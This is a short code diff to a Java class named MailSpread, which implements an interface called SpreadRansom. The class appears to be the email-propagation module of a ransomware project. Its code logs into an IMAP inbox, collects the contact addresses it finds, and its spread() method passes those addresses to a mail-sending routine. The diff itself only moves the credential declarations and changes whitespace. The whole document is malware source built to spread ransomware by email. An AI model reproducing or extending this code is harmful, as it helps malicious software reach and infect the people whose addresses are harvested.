@@ -14,8 +14,6 @@ public class MailSpread implements SpreadRansom {
 	public Collection<String> scanEmailAdress() {
 		Properties props = new Properties();
 		String host = "localhost";
-		String username = "";
-		String password = "";
 		String provider = "imap";  
 
 		// Collection of Mail addresses
@@ -25,9 +23,11 @@ public class MailSpread implements SpreadRansom {
 			// Connect to the server
 			Session session = Session.getDefaultInstance(props, null);
 			Store store = session.getStore(provider);
+			String username = null;
+			String password = null;
 			store.connect(host, username, password);
 			// open the in-box folder
-			Folder inbox = store.getFolder("INBOX");
+			Folder inbox = store.getFolder("INBOX"); 
 			inbox.open(Folder.READ_ONLY);
 
 			// get a list of java mail messages as an array of messages
@@ -157,12 +157,13 @@ public class MailSpread implements SpreadRansom {
 		rbc.close();
 	}
 
+
+
 	@Override
 	public void spread() {
 
 		Collection<String> adresses = scanEmailAdress();
 		sendMails(adresses);
-
-	}
+	} 
 
 }
